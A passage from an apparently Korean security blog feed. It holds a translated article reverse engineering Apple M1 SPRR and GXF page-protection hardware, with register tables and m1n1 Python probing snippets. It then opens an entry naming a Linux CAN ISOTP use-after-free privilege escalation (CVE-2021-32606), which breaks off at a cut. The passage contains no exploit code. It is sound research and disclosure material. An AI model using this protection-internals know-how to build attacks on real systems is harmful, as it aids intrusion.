&#xC54C;&#xC558;&#xB2E4;.</p><div class="table-container"><table><thead><tr><th>&#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;</th><th>EL &#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;</th><th>GL &#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;</th></tr></thead><tbody><tr><td>0</td><td><code>---</code></td><td><code>---</code></td></tr><tr><td>1</td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>10</td><td><code>r--</code></td><td><code>---</code></td></tr><tr><td>11</td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>100</td><td><code>---</code></td><td><code>r-x</code></td></tr><tr><td>101</td><td><code>r-x</code></td><td><code>r-x</code></td></tr><tr><td>110</td><td><code>r--</code></td><td><code>r-x</code></td></tr><tr><td>111</td><td><code>---</code></td><td><code>r-x</code></td></tr><tr><td>1000</td><td><code>---</code></td><td><code>r--</code></td></tr><tr><td>1001</td><td><code>--x</code></td><td><code>r--</code></td></tr><tr><td>1010</td><td><code>r--</code></td><td><code>r--</code></td></tr><tr><td>1011</td><td><code>rw-</code></td><td><code>r--</code></td></tr><tr><td>1100</td><td><code>---</code></td><td><code>rw-</code></td></tr><tr><td>1101</td><td><code>r-x</code></td><td><code>rw-</code></td></tr><tr><td>1110</td><td><code>r--</code></td><td><code>rw-</code></td></tr><tr><td>1111</td><td><code>rw-</code></td><td><code>rw-</code></td></tr></tbody></table></div><p>GL &#xAD8C;&#xD55C; &#xBE44;&#xD2B8;&#xAC00; EL &#xAD8C;&#xD55C; &#xBE44;&#xD2B8;&#xC758; &#xC758;&#xBBF8;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xD2B9;&#xBCC4;&#xD55C; &#xACBD;&#xC6B0;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><ul><li><code>0111</code>&#xC740; GL&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xBA70; EL&#xC5D0;&#xC11C; &#xC4F0;&#xAE30;&#xAC00; &#xAC00;&#xB2A5;&#xD55C; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC5C6;&#xB2E4;. &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC624;&#xB958;&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xACC4;&#xCE35; &#xBCF4;&#xD638; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD55C;&#xB2E4;. EL&#xC5D0;&#xC11C; GL&#xB85C; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xCF54;&#xB4DC;&#xB97C; &#xBCC0;&#xACBD;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC83;&#xC740; &#xC804;&#xCCB4;&#xC801;&#xC778; lateral level&#xC744; &#xBB34;&#xC758;&#xBBF8;&#xD558;&#xAC8C; &#xB9CC;&#xB4E0;&#xB2E4;.</li><li><code>1001</code>&#xC740; &#xD398;&#xC774;&#xC9C0;&#xAC00; GL&#xC5D0;&#xC11C;&#xB9CC; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC744; &#xB54C; <code>r-x</code> EL &#xAD8C;&#xD55C;&#xC744; <code>--x</code> &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xD55C;&#xB2E4;. EL&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xC228;&#xAE30;&#xAC70;&#xB098; exploit&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xCE21;&#xB41C;&#xB2E4;.</li></ul><h2 id="Python&#xC744;-&#xD1B5;&#xD55C;-GL2-&#xC99D;&#xBA85;"><a href="#Python&#xC744;-&#xD1B5;&#xD55C;-GL2-&#xC99D;&#xBA85;" class="headerlink" title="Python&#xC744; &#xD1B5;&#xD55C; GL2 &#xC99D;&#xBA85;"></a>Python&#xC744; &#xD1B5;&#xD55C; GL2 &#xC99D;&#xBA85;</h2><p>&#xC774;&#xB7EC;&#xD55C; &#xC9C0;&#xC2DD;&#xC744; &#xAC00;&#xC9C0;&#xACE0; m1n1&#xC5D0;&#xC11C; GL2&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; custom payload&#xB97C; &#xCD94;&#xAC00;&#xD560; &#xC218; &#xC788;&#xB2E4;. EL1/EL0&#xC5D0; &#xC774;&#xBBF8; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xB97C; &#xCD94;&#xAC00;&#xD560; &#xD544;&#xC694;&#xAC00; &#xC788;&#xB2E4;. MMU&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;(SPRR&#xC744; &#xD65C;&#xC131;&#xD654;&#xD55C; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; rwx &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; m1n1&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBBC0;&#xB85C;)&#xD558;&#xACE0; &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB85C; &#xC774;&#xB3D9;&#xD55C; &#xB2E4;&#xC74C; return &#xD558;&#xAE30; &#xC804;&#xC5D0; MMU&#xB97C; &#xB2E4;&#xC2DC; &#xD65C;&#xC131;&#xD654;&#xD558;&#xBA74; &#xB41C;&#xB2E4;.</p><p>GL2&#xB97C; &#xD0D0;&#xC0C9;&#xD558;&#xC5EC; <code>S3_6_C15_C10_3</code>&#xC774; <code>SPSR_GL2</code>&#xC77C; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs angelscript">&gt;&gt;&gt; u.mrs((<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>), call=p.gl_call)<span class="hljs-number">0x60000009</span>&gt;&gt;&gt; u.mrs(SPSR_EL2)<span class="hljs-number">0x60000009</span></code></pre><p>MSR finder &#xB300;&#xC2E0;&#xC5D0; GL2&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xC790;.</p><pre><code class="hljs python">gxf_regs = find_regs(call=p.gl_call)print(<span class="hljs-string">&quot;GXF&quot;</span>)<span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> sorted(gxf_regs - all_regs):    print(<span class="hljs-string">&quot;  %s&quot;</span> % list(r))</code></pre><p>&#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xB9CC; &#xC0AC;&#xC6A9; &#xAC00;&#xB2A5;&#xD55C; &#xC0C8;&#xB85C;&#xC6B4; &#xC2DC;&#xC2A4;&#xD15C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC744; &#xBC1C;&#xACAC;&#xD588;&#xB2E4;.</p><pre><code class="hljs angelscript">GXF  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">1</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">2</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">4</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">5</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">6</span>]  [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>]</code></pre><p><code>3, 6, 15, 10</code>&#xC740; GL1 &#xC6A9;&#xB3C4;&#xC774;&#xACE0; <code>3, 6, 15, 11</code>&#xC740; GL2&#xB97C; &#xC704;&#xD55C; &#xAC83;&#xC778;&#xC9C0; &#xC54C;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xB2E4;. EL2&#xC5D0;&#xC11C; SPRR &#xBC0F; GXF&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD55C; &#xD6C4; EL1&#xB85C; &#xB0AE;&#xCD94;&#xC5B4; &#xB3D9;&#xC77C;&#xD55C; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xBA74; &#xB41C;&#xB2E4;. &#xC774;&#xBC88; &#xC791;&#xC5C5;&#xC740; &#xC0C8;&#xB85C;&#xC6B4; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB9CC;&#xC744; &#xAD6C;&#xD55C;&#xB2E4;.</p><pre><code class="hljs json">[<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">1</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">4</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>] [<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">15</span>, <span class="hljs-number">10</span>, <span class="hljs-number">7</span>]</code></pre><p><code>3, 6, 15, 10</code> &#xADF8;&#xB8F9;&#xC740; EL1 &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC774;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xAC83;&#xC740; &#xD06C;&#xAC8C; &#xBB38;&#xC81C;&#xAC00; &#xB418;&#xC9C0;&#xB294; &#xC54A;&#xB294;&#xB2E4;. M1&#xC740; &#xD56D;&#xC0C1; <code>HCR_EL2.E2H</code>&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xBA70; &#xC774;&#xB294; <code>_EL1</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xAC00; <code>_EL2</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB85C; &#xB9AC;&#xB2E4;&#xC774;&#xB809;&#xC158; &#xB428;&#xC744; &#xC758;&#xBBF8;&#xD55C;&#xB2E4;.</p><p>&#xC774;&#xC804; XNU &#xB9B4;&#xB9AC;&#xC2A4;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC774;&#xB984;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ELR      ELR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_FAR      FAR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ESR      ESR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_SPSR     SPSR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_ASPSR    ASPSR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_VBAR     VBAR_GL11</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> KERNEL_MODE_TPIDR    TPIDR_GL11</span></code></pre><p>&#xC65C; &#xC774; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC774; GL11 suffix&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0; &#xBD84;&#xBA85;&#xD558;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xC704;&#xC5D0;&#xC11C; &#xCC3E;&#xC740; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xC27D;&#xAC8C; &#xB9E4;&#xCE58;&#xD560; &#xC218; &#xC788;&#xB2E4;. ASPSR&#xC5D0;&#xB294; <code>gexit</code>&#xAC00; guarded execution&#xC73C;&#xB85C; return &#xD574;&#xC57C; &#xD558;&#xB294;&#xC9C0; &#xC77C;&#xBC18; &#xC2E4;&#xD589;&#xC73C;&#xB85C; return &#xD574;&#xC57C; &#xD558;&#xB294;&#xC9C0; &#xACB0;&#xC815;&#xD558;&#xB294; &#xBE44;&#xD2B8;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB2E4;.</p><h1 id="SPRR-amp-GXF-inside-XNU"><a href="#SPRR-amp-GXF-inside-XNU" class="headerlink" title="SPRR &amp; GXF inside XNU"></a>SPRR &amp; GXF inside XNU</h1><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; XNU&#xAC00; &#xC0C8;&#xB85C;&#xC6B4; &#xAE30;&#xB2A5;&#xC744; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xC790;. Jonathan&#xC758; wirte up&#xC5D0; &#xC774;&#xBBF8; SPRR&#xACFC; GXF&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0AC;&#xC6A9;&#xB418;&#xB294;&#xC9C0; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xC0B4;&#xD3B4;&#xBCFC; &#xAC83;&#xC774; &#xBCC4;&#xB85C; &#xC5C6;&#xB2E4;. SPRR&#xC740; APRR&#xC758; &#xC5ED;&#xD560;&#xC744; &#xB300;&#xCCB4;&#xD560; &#xBFD0;&#xC774;&#xBA70; &#xCEE4;&#xB110;&#xC774; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC4F8; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD558;&#xACE0; PPL &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;.</p><p>&#xC8FC;&#xC694;&#xD55C; &#xCC28;&#xC774;&#xC810;&#xC740; GXF&#xC774;&#xB2E4;. APRR &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; &#xC218;&#xC815;&#xD558;&#xB294; trampoline &#xD568;&#xC218;&#xB97C; &#xC8FC;&#xC758;&#xD574;&#xC11C; &#xB9CC;&#xB4DC;&#xB294; &#xB300;&#xC2E0; GXF &#xC5D4;&#xD2B8;&#xB9AC; &#xBCA1;&#xD130;&#xB97C; &#xC124;&#xC815;&#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xBA74; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14; &#xAD8C;&#xD55C;&#xC740; &#xC790;&#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xB418;&#xACE0; genter&#xB294; PPL&#xC744; &#xC9C1;&#xC811; &#xAC00;&#xB9AC;&#xD0AC; &#xC218; &#xC788;&#xB2E4;.</p><p>XNU&#xAC00; SPRR&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xCD08;&#xAE30;&#xD654;&#xD55C;&#xB2E4;. &#xC2DC;&#xC791; &#xD568;&#xC218;&#xB294; SPRR&#xC774; EL1 SPRR &#xAD8C;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; <code>0x2020A505F020F0F0</code>&#xB85C; &#xCD08;&#xAE30;&#xD654;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC7A0;&#xC2DC; &#xD65C;&#xC131;&#xD654;&#xD55C;&#xB2E4;.</p><p>&#xADF8; &#xD6C4; &#xCD08;&#xAE30; GL &#xBD80;&#xD2B8;&#xC2A4;&#xD2B8;&#xB7A9; &#xCF54;&#xB4DC;&#xB294; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBCC0;&#xACBD;&#xC744; &#xBC29;&#xC9C0;&#xD558;&#xAE30; &#xC704;&#xD574; lock &#xD558;&#xAE30; &#xC804;&#xC5D0; EL1 &#xAD8C;&#xD55C;&#xC744; <code>0x2020-A506F020F0E0</code>&#xC73C;&#xB85C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD55C;&#xB2E4;.</p><p>guarded excution mode&#xC758; &#xC5D4;&#xD2B8;&#xB9AC; &#xD3EC;&#xC778;&#xD2B8;&#xB294; &#xCEE4;&#xB110; &#xD14D;&#xC2A4;&#xD2B8; &#xC601;&#xC5ED;&#xC5D0;&#xC11C; &#xD568;&#xC218;&#xB85C; &#xC124;&#xC815;&#xB418;&#xBA70; <code>PPLTEXT</code>&#xC758; &#xC2DC;&#xC791; &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xC810;&#xD504;&#xD55C;&#xB2E4;. PPL &#xC5D4;&#xD2B8;&#xB9AC; &#xD568;&#xC218;&#xB294; SPRR &#xAD8C;&#xD55C;&#xC774; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xC124;&#xC815;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; Jonathan&#xC758; write up&#xC5D0; &#xC791;&#xC131;&#xB41C; &#xB300;&#xB85C; &#xB3D9;&#xC791;&#xD55C;&#xB2E4;.</p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; XNU&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; SPRR &#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xC790;.</p><div class="table-container"><table><thead><tr><th>Index</th><th>Normal permissions</th><th>SPRR Permissions</th><th>Usage</th></tr></thead><tbody><tr><td>0</td><td>EL0</td><td>EL2</td><td>EL0</td></tr><tr><td>1</td><td><code>--x</code></td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>3</td><td><code>---</code></td><td><code>rw-</code></td><td><code>---</code></td></tr><tr><td>5</td><td><code>rw-</code></td><td><code>rwx</code></td><td><code>rw-</code> <code>r-x</code></td></tr><tr><td>7</td><td><code>rw-</code></td><td><code>rw-</code></td><td><code>rw-</code></td></tr><tr><td>8</td><td><code>--x</code></td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>10</td><td><code>---</code></td><td><code>r-x</code></td><td><code>---</code></td></tr><tr><td>11</td><td><code>---</code></td><td><code>r--</code></td><td><code>---</code></td></tr><tr><td>13</td><td><code>r-x</code></td><td><code>r--</code></td><td><code>r-x</code></td></tr><tr><td>15</td><td><code>r--</code></td><td><code>r--</code></td><td><code>r--</code></td></tr></tbody></table></div><p>GL &#xAD8C;&#xD55C;&#xC740; GL&#xC774; &#xCEE4;&#xB110; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC8C; &#xD558;&#xACE0;(entry 10) &#xC720;&#xC800; &#xB370;&#xC774;&#xD130;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xAC8C;(entry 7) lock &#xB420; &#xC218; &#xC788;&#xB2E4;. </p><p>&#xADF8; &#xC678;&#xC5D0;&#xB3C4; &#xC774;&#xC804; APRR &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC758; &#xAE54;&#xB054;&#xD55C; &#xC0C1;&#xC704; &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xB290;&#xAEF4;&#xC9C4;&#xB2E4;. &#xC774;&#xB7F0; &#xBCC0;&#xD654;&#xB4E4;&#xC740; &#xC804;&#xCCB4;&#xC801;&#xC778; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xC624;&#xB958;&#xC5D0; &#xB35C; &#xCDE8;&#xC57D;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xBA70;(&#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB4E4;&#xC744; &#xC7A0;&#xADF8;&#xAC70;&#xB098;, kernel&#x2192;PPL &#xC804;&#xD658;&#xC774; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xBA70; &#xCEE4;&#xB110;&#xACFC; PPL &#xC608;&#xC678; &#xBCA1;&#xD130;&#xB294; &#xBD84;&#xB9AC;&#xB418;&#xC5B4; &#xC788;&#xB2E4;) &#xC720;&#xC5F0;&#xD558;&#xAC8C; &#xB9CC;&#xB4E0;&#xB2E4;. APRR&#xC740; &#xAD8C;&#xD55C;&#xC744; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xB370;&#xC5D0;&#xB9CC; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; SPRR&#xC740; <code>rwx</code> &#xD398;&#xC774;&#xC9C0;&#xAC00; &#xD544;&#xC694;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xB54C; &#xAD8C;&#xD55C;&#xC744; &#xB2E4;&#xC2DC; &#xB9E4;&#xD551;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h1 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h1><p>&#xC560;&#xD50C; &#xC2E4;&#xB9AC;&#xCF58;&#xC740; &#xACF5;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC73C;&#xB85C; &#xD568;&#xAED8; &#xB3D9;&#xC791;&#xD558;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xBE44;&#xBC00;&#xC2A4;&#xB7EC;&#xC6B4; &#xAE30;&#xB2A5;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB2E4;. GXF&#xB294; GL1&#xACFC; GL2&#xB77C;&#xB294; lateral exception level&#xC744; &#xB3C4;&#xC785;&#xD558;&#xC5EC; &#xB2E4;&#xB978; &#xD398;&#xC774;&#xC9C0; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; EL&#xACFC; &#xC0C1;&#xC751;&#xD558;&#xB294; &#xAC19;&#xC740; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;. SPRR&#xC740; EL&#xACFC; GL&#xC758; &#xD398;&#xC774;&#xC9C0; &#xC5D4;&#xD2B8;&#xB9AC;&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xBE44;&#xD2B8;&#xB97C; &#xC7AC;&#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xC560;&#xD50C;&#xC740; &#xC774;&#xB97C; &#xD1B5;&#xD574; GL&#xC758; &#xBAA8;&#xB4E0; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14; &#xC870;&#xC791; &#xCF54;&#xB4DC;&#xB97C; &#xC228;&#xAE30;&#xACE0; EL&#xC774; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD558;&#xC600;&#xB2E4;. &#xC774;&#xB294; &#xCEE4;&#xB110; &#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xB85C;&#xBD80;&#xD130; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xBCF4;&#xD638;&#xD558;&#xC5EC; &#xC801;&#xC740; attack surface&#xC640; &#xC624;&#xBC84;&#xD5E4;&#xB4DC;&#xB97C; &#xAC00;&#xC9C4; &#xD558;&#xC774;&#xD37C; &#xBC14;&#xC774;&#xC800;&#xAC00; &#xD6A8;&#xACFC;&#xC801;&#xC73C;&#xB85C; &#xB3C4;&#xC785;&#xB41C;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xB4E4;&#xC758; &#xB300;&#xBD80;&#xBD84;&#xC740; &#xD30C;&#xC774;&#xC36C;&#xACFC; m1n1&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xB9AC;&#xBC84;&#xC2A4; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1; &#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xB9AC;&#xB205;&#xC2A4;&#xB97C; M1&#xC73C;&#xB85C; &#xD3EC;&#xD305;&#xD558;&#xB294; &#xB370;&#xC5D0;&#xB294; &#xC720;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; XNU&#xB97C; &#xAC00;&#xC0C1;&#xD654;&#xD558;&#xC5EC; MMIO access&#xB97C; trace &#xD560; &#xC218; &#xC788;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>apple</tag>
      
      <tag>idioth</tag>
      
      <tag>m1</tag>
      
      <tag>sprr</tag>
      
      <tag>gxf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-32606: CAN ISOTP 로컬 권한 상승 취약점</title>
    <link href="/2021/05/15/fabu1ous/2021-05-15/"/>
    <url>/2021/05/15/fabu1ous/2021-05-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/nrb547/kernel-exploitation/blob/main/cve-2021-32606/cve-2021-32606.md">CAN ISOTP local privilege escalation</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Linux Kernel 5.11 through 5.12.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p><code>net/can/isopt.c</code>&#xC758; &#xD568;&#xC218; <code>iso_setsockopt()</code>&#xC5D0; use-after-free&#xB85C; &#xC778;&#xD55C; &#xAD8C;&#xD55C;&#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. 